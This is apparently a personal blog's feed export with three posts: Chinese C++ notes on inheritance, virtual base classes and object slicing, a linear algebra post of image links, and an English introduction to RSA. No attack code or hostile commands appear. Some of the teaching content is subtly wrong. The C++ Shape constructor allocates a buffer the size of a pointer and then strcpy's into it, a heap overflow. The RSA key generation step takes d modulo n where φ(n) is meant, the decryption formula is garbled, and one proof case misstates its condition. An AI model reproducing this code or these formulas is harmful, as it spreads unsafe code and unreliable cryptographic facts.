<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">派生类名::派生类名(基类所需的形参,本类成员所需的形参):</span><br><span class="line">	基类<span class="number">1</span>(基类参数表<span class="number">1</span>),基类<span class="number">2</span>(基类参数表<span class="number">2</span>),...,基类<span class="built_in">n</span>(基类参数表n)</span><br><span class="line">&#123;</span><br><span class="line">	本类基本类型数据成员初始化:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​
“基类1(基类参数表1),基类2(基类参数表2),...,基类n(基类参数表n)”称为<strong>构造函数初始化列表</strong>，简称为<strong>初始化列表</strong>，用来调用基类构造函数以及为基类构造函数传递参数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">color</span></span><br><span class="line">&#123;</span><br><span class="line">    red,</span><br><span class="line">    yellow,</span><br><span class="line">    blue,</span><br><span class="line">    white,</span><br><span class="line">    black</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Shape</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">char</span> *author;</span><br><span class="line">    color s;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Shape</span>(<span class="type">const</span> <span class="type">char</span> *, color);</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Change</span><span class="params">(color)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123; cout &lt;&lt; endl</span><br><span class="line">                       &lt;&lt; author &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; s; &#125;</span><br><span class="line">    ~<span class="built_in">Shape</span>();</span><br><span class="line">&#125;;</span><br><span class="line">Shape::<span class="built_in">Shape</span>(<span class="type">const</span> <span class="type">char</span> *c, color i)</span><br><span class="line">&#123;</span><br><span class="line">    author = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">sizeof</span>(c)];</span><br><span class="line">    <span class="built_in">strcpy</span>(author, c);</span><br><span class="line">    s = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Shape::Change</span><span class="params">(color i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    s = i;</span><br><span class="line">&#125;</span><br><span class="line">Shape::~<span class="built_in">Shape</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">delete</span>[] author;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Circle</span> : <span class="keyword">public</span> Shape</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">double</span> r;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Circle</span>(<span class="type">const</span> <span class="type">char</span> *c, color i, <span class="type">double</span> z);</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Change</span><span class="params">(color, <span class="type">double</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line">Circle::<span class="built_in">Circle</span>(<span class="type">const</span> <span class="type">char</span> *c, color i, <span class="type">double</span> z) : <span class="built_in">Shape</span>(c, i)</span><br><span class="line">&#123;</span><br><span class="line">    r = z;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Circle::Change</span><span class="params">(color s, <span class="type">double</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Shape::<span class="built_in">Change</span>(s);</span><br><span class="line">    r = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Circle::show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Shape::<span class="built_in">show</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Shape <span class="title">shape1</span><span class="params">(<span class="string">&quot;wang&quot;</span>, red)</span></span>;</span><br><span class="line">    shape1.<span class="built_in">show</span>();</span><br><span class="line">    <span class="function">Circle <span class="title">circle1</span><span class="params">(<span class="string">&quot;zhang&quot;</span>, red, <span class="number">3</span>)</span></span>;</span><br><span class="line">    circle1.<span class="built_in">show</span>();</span><br><span class="line">    circle1.<span class="built_in">Change</span>(black, <span class="number">6</span>);</span><br><span class="line">    circle1.<span class="built_in">show</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​ 如果是单继承，派生类构造函数的形式会更简单。</p>
<h3 id="派生类的析构函数">派生类的析构函数</h3>
<p>​
派生类不能继承基类的析构函数，需要自己的定义析构函数。派生类的析构函数只需要清理它新定义的成员，一般来说只需要清理堆区的成员。</p>
<p>​
如果没有特殊指针数据成员需要清理，可以使用由系统提供的默认析构函数。</p>
<p>​
当派生类对象消亡时，系统调用析构函数的顺序与建立派生类对象时调用构造函数的顺序正好相反，即<strong>先调用派生类的析构函数，再调用基类的析构函数</strong>。</p>
<h2 id="虚基类">虚基类</h2>
<h3 id="多继承和二义性">多继承和二义性</h3>
<p>​
多继承结构中，派生类可能有多个直接基类或间接基类，可能会引起成员访问的二义性或不确定性问题。</p>
<p>​
基类base的成员要继承到派生类Fderiver1和Fderiver2，然后又继承到派生类Sderiver，即Sderiver派生类中，基类的成员有两份拷贝。因此，通过Sderiver派生类的对象访问基类的公有成员时，编译系统就不知道应该如何从两份拷贝中进行选取，只好给出"ambiguos"的错误信息，即出现了二义性。</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230209125439645.png" /></p>
<p>​
二义性产生的原因是基类的构造函数调用了两次，调用两次构造函数所产生的基类成员都继承到派生类Sderiver，二义性也就产生了。如果基类构造函数只调用一次，这种类型的二义性就可以解决了。</p>
<h3 id="虚基类-1">虚基类</h3>
<p>​
我们可以将共同基类设置为虚基类，创建派生类对象时，虚基类的构造函数只会调用1次，虚基类的成员在第三层派生类对象中就只有一份拷贝，不会再引起二义性问题。</p>
<p>​
将共同基类设置为虚基类，需要在第一级派生类时就用关键字virtual修饰说明继承关系，其语法形式为：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> 派生类名: <span class="keyword">virtual</span> 继承方式 基类名</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​
在多继承情况下，虚基类关键词的作用范围和继承方式关键词相同，只对紧随其后的基类起作用。由于这一层的派生类的多个，这一层的其它派生类也需要用virtual关键词说明。</p>
<h2 id="同名覆盖和重载">同名覆盖和重载</h2>
<p>​ 同名覆盖(Override)：在类继承中才会出现</p>
<p>​
重载(Overload)：在<strong>同一作用域范围内</strong>，由<strong>参数个数或类型不同</strong>的多个<strong>同名函数</strong>构成，可以单独出现，也可以与override现象同时出现。</p>
<p>​
一般来说，同名覆盖现象中的多个函数原型(函数类型、名字、参数)是相同的，而重载现象中多个函数原型(参数)是不同的。</p>
<h2 id="转换与继承">转换与继承</h2>
<p>​ 派生类继承了基类成员，但基类成员收到访问控制的限制。</p>
<p>​ 派生类的成员与基类成员到底有上面不同呢：</p>
<p>​
每个派生类对象包含一个基类部分，这意味着可以像使用基类对象一样在派生类对象上执行基类的操作，这就涉及到派生类到基类的转换。这种转换包括以下三种情况：</p>
<ul>
<li>派生类对象转换为基类对象</li>
<li>基类对象指针指向派生类对象</li>
<li>用派生类对象初始化基类对象的引用</li>
</ul>
<h3 id="派生类对象转换为基类对象">派生类对象转换为基类对象</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TShape</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> x, y;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">TShape</span>(<span class="type">int</span> mx = <span class="number">0</span>, <span class="type">int</span> my = <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		x = mx;</span><br><span class="line">		y = my;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">Show</span><span class="params">()</span> </span>&#123; cout &lt;&lt; <span class="string">&quot;x=&quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;\t y=&quot;</span> &lt;&lt; y; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TCircle</span> : <span class="keyword">public</span> TShape</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">TCircle</span>(<span class="type">int</span> mx = <span class="number">0</span>, <span class="type">int</span> my = <span class="number">0</span>, <span class="type">int</span> mr = <span class="number">1</span>) : <span class="built_in">TShape</span>(mx, my) &#123; r = mr; &#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">Show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		TShape::<span class="built_in">Show</span>();</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\tr=&quot;</span> &lt;&lt; r;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	TShape s;</span><br><span class="line">	<span class="function">TCircle <span class="title">c</span><span class="params">(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span></span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;TShape s\t&quot;</span>;</span><br><span class="line">	s.<span class="built_in">Show</span>();</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;TCircle c\t&quot;</span>;</span><br><span class="line">	c.<span class="built_in">Show</span>();</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	s = c; <span class="comment">// 用派生类对象为基类对象赋值</span></span><br><span class="line">	<span class="comment">// s=static_cast&lt;TShape&gt;(c)</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;s=c \t\t&quot;</span>;</span><br><span class="line">	s.<span class="built_in">Show</span>();</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​ 编译后，运行的输出结果是：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">TShape s        x=0      y=0</span><br><span class="line">TCircle c       x=1      y=2    r=3</span><br><span class="line">s=c             x=1      y=2</span><br></pre></td></tr></table></figure>
<p>​
派生类对象c赋值给基类对象s之后，基类对象s仅获取了派生类对象c中内嵌的TShape子对象的值，而派生类对象c中的数据成员r被忽略了。</p>
<p>​
换句话说，在s=c这个赋值语句中，派生类对象c被截断成了两部分：<strong>内嵌TShape子对象</strong>和<strong>派生类独有</strong>的数据成员。这种现象被称为“<strong>对象截断</strong>”。</p>
<p>​
s=c语句实际上执行了一个隐式类型转换，将TCircle对象转换为了TShape对象。建议用<strong>s=static_cast&lt;TShape&gt;(c)</strong>替换<strong>s=c</strong></p>
<h3 id="基类指针指向派生类对象">基类指针指向派生类对象</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TShape</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> x, y;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">TShape</span>(<span class="type">int</span> mx = <span class="number">0</span>, <span class="type">int</span> my = <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		x = mx;</span><br><span class="line">		y = my;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">Show</span><span class="params">()</span> </span>&#123; cout &lt;&lt; <span class="string">&quot;x=&quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;\t y=&quot;</span> &lt;&lt; y; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TCircle</span> : <span class="keyword">public</span> TShape</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">TCircle</span>(<span class="type">int</span> mx = <span class="number">0</span>, <span class="type">int</span> my = <span class="number">0</span>, <span class="type">int</span> mr = <span class="number">1</span>) : <span class="built_in">TShape</span>(mx, my) &#123; r = mr; &#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">Show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		TShape::<span class="built_in">Show</span>();</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\tr=&quot;</span> &lt;&lt; r;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">TCircle <span class="title">c</span><span class="params">(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span></span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;TCircle c\t&quot;</span>;</span><br><span class="line">	c.<span class="built_in">Show</span>();</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	<span class="comment">// TShape* ps=&amp;c;</span></span><br><span class="line">	TShape *ps = <span class="built_in">dynamic_cast</span>&lt;TShape *&gt;(&amp;c); <span class="comment">// 基类对象指针指向派生类对象</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> != ps)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;ps=&amp;c\t\t&quot;</span>;</span><br><span class="line">		ps-&gt;<span class="built_in">Show</span>();</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​ 输出结果如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">TCircle c       x=<span class="number">1</span>      y=<span class="number">2</span>    r=<span class="number">3</span></span><br><span class="line">ps=&amp;c           x=<span class="number">1</span>      y=<span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>​
指针变量ps的类型是<strong>基类指针</strong>，实际指向是派生类对象c的TShape内嵌对象。</p>
<p>​
换句话说，*<strong>ps</strong>就是被截断的派生类对象c的一部分。需要注意的是，ps-&gt;Show()访问的是基类的函数<strong>TShape::Show()</strong>，而不是派生类的<strong>TCircle::Show()</strong>。</p>
<h3
id="用派生类对象初始化基类对象的引用">用派生类对象初始化基类对象的引用</h3>
<p>​
与“基类对象指针指向派生类对象”的类似，区别在于，引用只能在定义时赋值(初始化)，而指针变量可以在定义之后赋值。</p>
<h3 id="基类到派生不存在转换">基类到派生不存在转换</h3>
<p>​
编译器可以自动将派生类对象转换为基类对象（隐式类型转换），但是从基类到派生类的自动转换是不存在的。</p>
<p>​
原因是基类对象不包含派生类成员，若允许用基类对象给派生类对象赋值，那么就可以试图使用该派生类对象访问不存在的成员，显然会导致错误。</p>
<h2 id="题目-3">题目</h2>
<p><strong>在类的层次结构中，采用什么顺序调用构造函数？调用析构函数的顺序是什么？</strong>
构造函数的调用次序是:基类构造函数、内嵌对象的构造函数、派生类的构造函数；析构函数的调用次序与此相反</p>
]]></content>
      <categories>
        <category>Review</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Review</tag>
      </tags>
  </entry>
  <entry>
    <title>Linear Algebra Notes</title>
    <url>/archives/c0da8988.html</url>
    <content><![CDATA[<p>本人由于缓考辽，所以还在努力学习线代以及微积分，在这里post上一些线代的笔记，持续更新</p>
<p><del>感觉偏离这个Blog创建的初衷越来越远了</del> <span id="more"></span> <img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/MIT%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-02.jpg" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/MIT%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-04.jpg" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/MIT%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-05.jpg" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230119164822106.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/MIT%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-07.jpg" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230119164847506.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/MIT%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-09.jpg" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/MIT%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-10.jpg" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/MIT%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-11.jpg" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/MIT%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-12.jpg" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/MIT%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-13.jpg" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/MIT%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-14.jpg" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230130102621832.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230130102704922.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230130112409968.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230130112431236.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230130112446422.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230130112459524.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230130112519738.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230130112529498.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230130112543342.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230130112556215.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230204002127826.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230204002143741.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230204002159287.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230213165428158.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230213165441380.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230213165451234.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230213165503315.png" /></p>
]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>Linear Algebra</tag>
        <tag>Graph Theory</tag>
        <tag>Applied Math</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA-Basic</title>
    <url>/archives/afd04c14.html</url>
    <content><![CDATA[<h1 id="rsa-basic">RSA Basic</h1>
<p>Have a lot waiting to be written, but just post them for
convenience.</p>
<p>RSA is the first full public-key cryptosystem.</p>
<p>All operations in RSA involve <strong>modular
exponentiation.</strong></p>
<blockquote>
<p>Modular exponentiation is exponentiation performed over a
modulus.</p>
<p>Modular exponentiation is the remainder when an integer <span
class="math inline">\(b\)</span> (the base) is raised to the power <span
class="math inline">\(e\)</span> (the exponent), and divided by a
positive integer <span class="math inline">\(m\)</span> (the modulus);
that is, <span class="math inline">\(c=b^e \mod m\)</span>. Form the
definition of division, it follows that <span class="math inline">\(0
\leq c &lt; m\)</span>.</p>
<p>Modular exponentiation can be performed with a negative exponent
<span class="math inline">\(e\)</span> by finding the modular
multiplicative inverse <span class="math inline">\(d\)</span> of <span
class="math inline">\(b\)</span> modulo <span
class="math inline">\(m\)</span> using the extended Euclidean algorithm.
<span class="math display">\[ c=b^e \mod m=d^{-e} \mod m,where \space
e&lt;0 \space and \space b\cdot d \equiv 1\mod m \]</span></p>
</blockquote>
<blockquote>
<p>In RSA, modular exponentiation, together with the problem of prime
factorisation, helps us to build a "<a
href="https://en.wikipedia.org/wiki/Trapdoor_function">trapdoor
function</a>". This is a function that is easy to compute in one
direction, but hard to do in reverse unless you have the right
information. It allows us to encrypt a message, and only the person with
the key can perform the inverse operation to decrypt it.</p>
</blockquote>
<span id="more"></span>
<h2 id="prerequisites">Prerequisites:</h2>
<ul>
<li>Euler's Totient Function</li>
<li>Euler's Theorem</li>
<li>Multiplicative Inverse Theorem</li>
</ul>
<h2 id="operation">Operation</h2>
<h3 id="basic-principle">Basic Principle</h3>
<p>Find three large positive integers <em>e,d</em> and <em>n</em>, such
that <span class="math display">\[ (m^e)^d\equiv m\mod n \]</span> and
that knowing <em>e</em> and <em>n</em>, or even <em>m</em> will be
extremely difficult to find <em>d</em>.</p>
<p>In addition, for some operations it is convenient that the order of
the two exponentiations can be changed and that this relation also
implies <span class="math display">\[ (m^d)^e\equiv m\mod n \]</span>
RSA involves a <strong>public key</strong> and a <strong>private
key</strong>.</p>
<h3 id="key-generation">Key Generation</h3>
<ol type="1">
<li>Choose two large prime numbers p and q
<ul>
<li><em>p</em> and <em>q</em> should be chosen at random, be both large
and have a large difference.</li>
<li><em>p</em> and <em>q</em> should keep secret</li>
</ul></li>
<li>Compute <em>n=pq</em></li>
<li>Compute<span class="math inline">\(\space \space \varphi
(n)\space\)</span> ,where<span class="math inline">\(\space
\varphi(n)\space\)</span>is Euler's Totient Function.</li>
<li>Choose an integer <em>e</em> such that <span
class="math inline">\(2&lt;e&lt;\varphi(n)\)</span> and <span
class="math inline">\(gcd(e,\varphi(n))=1\)</span>,that is <em>e</em>
and <span class="math inline">\(\varphi(n)\)</span> is coprime.</li>
<li>Determined <em>d</em> as <span class="math inline">\(ed\equiv 1 \mod
n\)</span>. <em>d</em> is the modular multiplicative inverse of
<em>e</em> modulo <span class="math inline">\(\varphi(n)\)</span></li>
</ol>
<p>So, we get public key <em>n</em> and <em>e</em> , and private key
<em>n</em> and <em>d</em>.</p>
<h3 id="encryptiondecryption">Encryption&amp;Decryption</h3>
<p>Encry: <span class="math display">\[ c\equiv m^e \mod n \]</span>
Decry: <span class="math display">\[ c^d\equiv (m^e) m\mod n
\]</span></p>
<h3 id="sign-message">Sign Message</h3>
<p>Suppose Alice uses Bob's public key to send him an encrypted message.
In the message, she claimed to be Alice, but Bob has no way of verifying
that the message was from Alice, since anyone can use Bob's public key
to send him encrypted messages. So, we should sign the message.</p>
<p>Suppose message <em>m</em>,and <em>n,e,d</em>.</p>
<p>Suppose Alice want to send message <em>m</em> to Bob. She can use her
own private key to do so. She <strong>produces a hash value of the
message</strong>, and <span class="math inline">\(S=H(M)^d \mod
n\)</span>, and attaches it as a "signature" to the message. When Bob
receives the signed message, he <strong>uses the same hash algorithm in
conjunction with Alice's public key</strong>. He <span
class="math inline">\(H(M)=S^e\mod n\)</span> (as he does when
encrypting a message), and compares the resulting hash value with the
message's hash value. If the two agree, he knows that the author of the
message was in possession of Alice's private key and that the message
has not been tampered with since being sent.</p>
<p>Why: <span class="math display">\[ h(m)=hash(m) \]</span></p>
<p><span class="math display">\[ (h^e)^d=(h^d)^e\equiv h\mod n
\]</span></p>
<h2 id="proof-of-correctness">Proof of correctness</h2>
<p>(This part is not necessary to look.)</p>
<p><strong>Using Fermat's little theorem</strong></p>
<p>We want to show that <span class="math display">\[ \space
m^{ed}\equiv m \mod pq \]</span> for every integer <em>m</em> when
<em>p</em> and <em>q</em> are distinct prime numbers and <em>e</em> and
<em>d</em> are positive integers satisfying <span
class="math inline">\(ed\equiv 1 \mod \varphi(pq)\)</span></p>
<p>Since<span class="math inline">\(\space \space
\varphi(pq)=(p-1)(q-1)\space\)</span>so,we can write <span
class="math display">\[ ed-1=h(p-1)=k(q-1) \]</span> To check whether
two numbers, such as<span class="math inline">\(\space
m^{ed}\space\)</span>and <em>m</em>, are congruent mod <em>pq</em> , it
suffices to check that they are congruent mod <em>p</em> and mod
<em>q</em> separately.</p>
<p>To show<span class="math inline">\(\space m^{ed}\equiv m \mod
p\space\)</span>,we consider two cases:</p>
<ol type="1">
<li>If<span class="math inline">\(\space m\equiv 0 \mod
p\space\)</span>,<em>m</em> is a multiple of <em>p</em>. Thus <span
class="math inline">\(m^{ed}\)</span> is a multiple of <em>p</em>. So
<span class="math inline">\(m^{ed}\equiv 0\equiv m \mod p\)</span></li>
<li>If <span class="math inline">\(m\equiv 0 \mod p\)</span>, <span
class="math display">\[ m^{ed}=m^{ed-1}m=m^{h(p-1)}m=(m^{p-1})^hm\equiv
1^h m\equiv m\mod p \]</span> where we used Fermat's little theorem to
replace <span class="math inline">\(m^{p-1}\mod p\)</span> with 1.</li>
</ol>
<p>The verification that<span class="math inline">\(\space m^{ed}\equiv
m\mod q\space\)</span>proceeds in a completely analogous way.</p>
<p>So we can prove that <span class="math display">\[ (m^e)^d\equiv m
\mod pq \]</span></p>
<h1 id="attacks">Attacks</h1>
<h2 id="low-exponentssmall-values-of-m">Low exponents&amp;small values
of m</h2>
<p>low exponents and small values of m has a judgment <span
class="math display">\[ m&lt;n^{\frac{1}{e}} \]</span> the result of
<span class="math inline">\(m^e\)</span> is strictly less than modulus
<em>n</em>.</p>
<p>we can just taking the <em>e</em>th root of the ciphertext over the
integers.</p>
<h1 id="mathematica-basic">Mathematica Basic</h1>
<h2 id="eulers-totient-function">Euler's Totient Function</h2>
<p>Euler's Totient function counts the positive integers up to a given
integer <span class="math inline">\(n\)</span> that are relatively prime
to <span class="math inline">\(n\)</span>. also be called
<strong>Euler's phi function</strong>.</p>
<p>It is the number of integers <span class="math inline">\(k\)</span>
in the range(1,n) for which the greatest common divisor <span
class="math inline">\(gcd(n,k)=1\)</span>. The integers <span
class="math inline">\(k\)</span> of this form are sometimes referred to
as totatives of <span class="math inline">\(n\)</span>.</p>
<p>Euler's totient function is a multiplicative function, meaning that
if two numbers <span class="math inline">\(m\)</span> and <span
class="math inline">\(n\)</span> are relatively prime, then <span
class="math inline">\(\varphi(mn)=\varphi(m)\varphi(n)\)</span>. The
function gives the order of the multiplicative group of integers modulo
n(the group of units of the ring <span class="math inline">\(\mathbb
Z/n\mathbb Z\)</span>).</p>
<p><strong>Computing Euler's totient function</strong></p>
<p>It states: <span class="math display">\[ \varphi (n)=n \prod
_{p|n}(1-\frac{1}{p}) \]</span> where the product is over the distinct
prime numbers dividing <span class="math inline">\(n\)</span>.</p>
<p>An equivalent formulation is <span class="math display">\[
\varphi(n)=p_1^{k_1-1}(p_1-1)p_2^{k_2-1}(p_2-1)\cdots p_r^{k_r-1}(p_r-1)
\]</span> where <span class="math inline">\(n=p_1^{k_1}p_2^{k_2}\cdots
p_n^{k_n}\)</span> is the prime factorization of <span
class="math inline">\(n\)</span> (this is ,<span
class="math inline">\(p_1,p_2,\cdots,p_r\)</span> are distinct prime
numbers)</p>
